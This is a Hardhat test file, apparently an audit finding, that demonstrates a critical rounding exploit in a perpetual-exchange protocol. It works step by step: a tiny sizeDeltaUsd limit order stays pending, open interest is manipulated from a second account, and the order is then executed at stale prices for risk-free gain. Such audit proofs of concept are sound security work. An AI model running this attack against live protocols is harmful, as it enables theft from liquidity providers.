import { expect } from "chai";
import { mine, time } from "@nomicfoundation/hardhat-network-helpers";
import { deployFixture } from "../../../utils/fixture";
import { expandDecimals, decimalToFloat } from "../../../utils/math";
import { getBalanceOf, getSyntheticTokenAddress, getSupplyOf } from "../../../utils/token";
import { getDepositCount, getDepositKeys, createDeposit, executeDeposit, handleDeposit } from "../../../utils/deposit";
import * as keys from "../../../utils/keys";
import { getAccountPositionCount, getPositionCount, getPositionKeys } from "../../../utils/position";
import {
  OrderType,
  getOrderCount,
  handleOrder,
  createOrder,
  executeOrder,
  getOrderKeys,
  DecreasePositionSwapType,
} from "../../../utils/order";
import { expectTokenBalanceIncrease } from "../../../utils/token";
import { grantRole } from "../../../utils/role";
import { executeLiquidation } from "../../../utils/liquidation";
import { ethers } from "hardhat";
import { TOKEN_ORACLE_TYPES } from "../../../utils/oracle";
import { BigNumber } from "ethers";
import { getIsAdlEnabled, updateAdlState, executeAdl } from "../../../utils/adl";
import { getPoolAmount, getMarketTokenPrice } from "../../../utils/market";
import { claimableCollateralAmountKey } from "../../../utils/keys";
import { createWithdrawal, executeWithdrawal, handleWithdrawal, getWithdrawalCount } from "../../../utils/withdrawal";
import { hashData, hashString, encodeData } from "../../../utils/hash";

describe("Guardian.IPU-1", () => {
  const { provider } = ethers;

  let fixture;
  let user0, user1, user2, wallet;
  let reader,
    dataStore,
    oracle,
    depositVault,
    ethUsdMarket,
    ethUsdSpotOnlyMarket,
    wnt,
    usdc,
    exchangeRouter,
    orderHandler,
    referralStorage,
    orderVault,
    positionUtils,
    solAddr,
    positionStoreUtils,
    tokenUtils,
    wntAccurate,
    ethUsdAccurateMarket,
    marketUtils,
    solUsdMarket,
    config;
  let roleStore, decreasePositionUtils, executionFee, prices;
  let eventEmitter, adlUtils;

  beforeEach(async () => {
    fixture = await deployFixture();

    ({ wallet, user0, user1, user2 } = fixture.accounts);
    ({ executionFee, prices } = fixture.props);
    ({
      reader,
      dataStore,
      orderHandler,
      oracle,
      depositVault,
      ethUsdMarket,
      orderVault,
      ethUsdSpotOnlyMarket,
      tokenUtils,
      wnt,
      marketUtils,
      referralStorage,
      positionUtils,
      usdc,
      exchangeRouter,
      positionStoreUtils,
      roleStore,
      decreasePositionUtils,
      eventEmitter,
      wntAccurate,
      ethUsdAccurateMarket,
      solUsdMarket,
      config,
      adlUtils,
    } = fixture.contracts);

    await grantRole(roleStore, wallet.address, "LIQUIDATION_KEEPER");
    solAddr = getSyntheticTokenAddress("SOL");

    await handleDeposit(fixture, {
      create: {
        market: ethUsdMarket,
        longTokenAmount: expandDecimals(1000, 18),
        shortTokenAmount: expandDecimals(500 * 1000, 6),
      },
    });
  });

  it("CRITICAL: Minuscule sizeDeltaUsd amounts can be used to game the exchange", async () => {
    const initialWNTBal = expandDecimals(10, 18); // 10 ETH E.g. $50,000 -- used for orders that manipulate OI
    const initialUSDCBal = expandDecimals(1_000_000, 6); // $1M USDC (hopefully X_X)

    // Attacker creates a limitIncrease where the sizeDeltaUsd will get
    // rounded to 0 when divided by the indexToken price

    // Consider the following price action
    //
    // $ |  \                 ____/
    //   |   \               /
    // t |----\-------------/----------
    // s |-----\__--/\___/\/-----------
    //   |        \/
    //   +----Y-------------------X---- time
    //
    // t - triggerPrice
    // s - price where sizeDeltaUsd / indexTokenPrice > 0

    // The execution of the order will revert with an EmptyPosition error as long as
    // the sizeDeltaUsd is < indexToken price.

    // So the trader assigns sizeDeltaUsd = s, where s = t-1 (triggerPrice - 1 wei)
    // The order type is a LimitIncrease long, so the trader will receive their triggerPrice
    // Now in order for the order to succeed & be executed the trader must experience 1 wei of positive impact
    // on the triggerPrice => executionPrice will be s => sizeDeltaUsd / s = 1 => order does not revert with EmptyPosition

    // The net result is a risk-free trade where the attacker is able to use prices from time Y
    // to execute an order at time X.

    // First make a pool wildly off-balance, so the malicious user can control the price impact
    const priceImpactIncreaseParams = {
      account: user2, // Uses a different address
      market: ethUsdMarket,
      minOutputAmount: 0,
      initialCollateralToken: wnt,
      initialCollateralDeltaAmount: initialWNTBal,
      sizeDeltaUsd: decimalToFloat(500 * 1000), // Open a bunch of long OI so that the subsequent LI will be negatively impacted
      acceptablePrice: expandDecimals(5001, 12),
      triggerPrice: expandDecimals(5000, 12),
      orderType: OrderType.MarketIncrease,
      isLong: true,
      shouldUnwrapNativeToken: false,
    };

    expect(await getOrderCount(dataStore)).to.eq(0);

    await handleOrder(fixture, {
      create: priceImpactIncreaseParams,
      execute: {
        tokens: [wnt.address],
        precisions: [8],
        minPrices: [expandDecimals(5000, 4)],
        maxPrices: [expandDecimals(5000, 4)],
        priceFeedTokens: [usdc.address],
      },
    });

    expect(await getOrderCount(dataStore)).to.eq(0);
    expect(await getPositionCount(dataStore)).to.eq(1);

    // Turn price impact on
    await dataStore.setUint(keys.positionImpactFactorKey(ethUsdMarket.marketToken, true), decimalToFloat(2, 8));
    await dataStore.setUint(keys.positionImpactFactorKey(ethUsdMarket.marketToken, false), decimalToFloat(2, 8));
    await dataStore.setUint(keys.positionImpactExponentFactorKey(ethUsdMarket.marketToken), decimalToFloat(1));

    // sizeDeltaUsd is 1 wei less than the triggerPrice
    const sizeDeltaUsd = expandDecimals(4999, 12);

    const attackIncreaseParams = {
      account: user1,
      market: ethUsdMarket,
      minOutputAmount: 0,
      initialCollateralToken: usdc,
      initialCollateralDeltaAmount: initialUSDCBal, // Large USDC collateral of 1M
      swapPath: [ethUsdMarket.marketToken], // swapPath used to game outdated prices to buy ETH at risk-free profits
      sizeDeltaUsd,
      acceptablePrice: expandDecimals(10000, 12), // Non-constrictive acceptablePrice
      triggerPrice: expandDecimals(5000, 12),
      orderType: OrderType.LimitIncrease,
      isLong: true,
      shouldUnwrapNativeToken: false,
    };

    await createOrder(fixture, attackIncreaseParams);

    expect(await getOrderCount(dataStore)).to.eq(1);

    // Execution reverts due to EmptyPosition
    await expect(
      executeOrder(fixture, {
        tokens: [wnt.address, wnt.address],
        precisions: [8, 8],
        minPrices: [expandDecimals(5010, 4), expandDecimals(4990, 4)],
        maxPrices: [expandDecimals(5010, 4), expandDecimals(4990, 4)],
        priceFeedTokens: [usdc.address],
      })
    ).to.be.reverted;

    expect(await getOrderCount(dataStore)).to.eq(1);
    expect(await getPositionCount(dataStore)).to.eq(1);

    // Now time passes and the attacker sees that price moves in their favor, say ETH goes to $6,000
    // So they decide to allow the order to be executed @ the past price of ~5,000
    // The attacker now manipulates the OI in the pool so that the triggerPrice is
    // positively impacted & the sizeDeltaInTokens no longer rounds to 0.
    const priceImpactDecreaseParams = {
      account: user2, // Uses the alternate address thats used to manipulate OI
      market: ethUsdMarket,
      minOutputAmount: 0,
      initialCollateralToken: wnt,
      initialCollateralDeltaAmount: 0,
      sizeDeltaUsd: decimalToFloat(500 * 1000), // close position to remove negative impact
      acceptablePrice: expandDecimals(5999, 12),
      orderType: OrderType.MarketDecrease,
      isLong: true,
      shouldUnwrapNativeToken: false,
    };

    expect(await getOrderCount(dataStore)).to.eq(1);

    await createOrder(fixture, priceImpactDecreaseParams);

    expect(await getOrderCount(dataStore)).to.eq(2);

    const [attackLimitOrderKey, priceImpactDecreaseOrderKey] = await getOrderKeys(dataStore, 0, 2);

    const attackLimitOrder = await reader.getOrder(dataStore.address, attackLimitOrderKey);
    const priceImpactDecreaseOrder = await reader.getOrder(dataStore.address, priceImpactDecreaseOrderKey);

    expect(attackLimitOrder.numbers.orderType).to.eq(OrderType.LimitIncrease);
    expect(priceImpactDecreaseOrder.numbers.orderType).to.eq(OrderType.MarketDecrease);

    await executeOrder(fixture, {
      key: priceImpactDecreaseOrderKey,
      tokens: [wnt.address],
      precisions: [8],
      minPrices: [expandDecimals(6000, 4)],
      maxPrices: [expandDecimals(6000, 4)],
      priceFeedTokens: [usdc.address],
    });

    // OI has been reset
    expect(await getPositionCount(dataStore)).to.eq(0);

    // Our attack limit order is still in the store
    expect(await getOrderCount(dataStore)).to.eq(1);

    // Now the attacker manipulates OI so that they will be positively impacted
    // so that now their attack limit order can be executed.

    const priceImpactShortIncreaseParams = {
      account: user2, // Uses a different address
      market: ethUsdMarket,
      minOutputAmount: 0,
      initialCollateralToken: wnt,
      initialCollateralDeltaAmount: initialWNTBal,
      sizeDeltaUsd: decimalToFloat(50 * 1000), // Open some short OI so that user1 can be nominally positively impacted
      acceptablePrice: expandDecimals(5990, 12),
      orderType: OrderType.MarketIncrease,
      isLong: false, // Short order so that OI will now positively impact the attack because it is a long
      shouldUnwrapNativeToken: false,
    };

    expect(await getOrderCount(dataStore)).to.eq(1);
    expect(await getPositionCount(dataStore)).to.eq(0);

    await createOrder(fixture, priceImpactShortIncreaseParams);

    expect(await getOrderCount(dataStore)).to.eq(2);

    const [_, priceImpactShortIncreaseOrderKey] = await getOrderKeys(dataStore, 0, 2);

    const priceImpactShortIncreaseOrder = await reader.getOrder(dataStore.address, priceImpactShortIncreaseOrderKey);

    expect(priceImpactShortIncreaseOrder.numbers.orderType).to.eq(OrderType.MarketIncrease);

    await executeOrder(fixture, {
      key: priceImpactShortIncreaseOrderKey,
      tokens: [wnt.address],
      precisions: [8],
      minPrices: [expandDecimals(6000, 4)],
      maxPrices: [expandDecimals(6000, 4)],
      priceFeedTokens: [usdc.address],
    });

    expect(await getOrderCount(dataStore)).to.eq(1);
    expect(await getPositionCount(dataStore)).to.eq(1);

    // Now the attacker's limit order is able to be executed since it no longer reverts with the EmptyPosition Error
    // Net result, the attacker gets to decide when & if they would like to execute an order with past prices.
    await executeOrder(fixture, {
      key: attackLimitOrderKey,
      tokens: [wnt.address, wnt.address],
      precisions: [8, 8],
      minPrices: [expandDecimals(5010, 4), expandDecimals(4990, 4)],
      maxPrices: [expandDecimals(5010, 4), expandDecimals(4990, 4)],
      priceFeedTokens: [usdc.address],
    });

    expect(await getOrderCount(dataStore)).to.eq(0);
    expect(await getPositionCount(dataStore)).to.eq(2);

    // Attacker's position was opened with 1 wei of sizeInTokens
    const userPositions = await reader.getAccountPositions(dataStore.address, user1.address, 0, 5);
    expect(userPositions.length).to.eq(1);
    const userPosition = userPositions[0];

    expect(userPosition.numbers.sizeInTokens).to.eq(1);

    // Attacker's USDC collateral was swapped to ETH at past prices
    // $1,000,000 was swapped at ~$5,000 / ETH
    // However currently ETH is trading at $6,000
    // $1,000,000 / ~$5,000 = ~200 ETH
    // If they received the current market price execution, they would end up with:
    // $1,000,000 / $6,000 = ~166.666667 ETH

    const receivedEth = ethers.utils.parseEther("200");

    expect(userPosition.addresses.collateralToken).to.eq(wnt.address);
    expect(userPosition.numbers.collateralAmount).to.gt(receivedEth.mul(99).div(100));
    expect(userPosition.numbers.collateralAmount).to.lt(receivedEth.mul(101).div(100));

    // An attacker can capitalize on this by having an initialCollateralDeltaAmount that
    // is orders of magnitude larger than the capital necessary to manipulate the OI of the market
    // (ideally an attacker does this with a small market where position price impact by OI is easy to manipulate)
    // This initialCollateralDeltaAmount can be gamed to receive a risk-free trade with the swapPath as seen.

    // The attacker could also open up a significant amount of OI to the cap so that
    // no others could increase to effect PI and errantly trigger the order to go through
  });
});
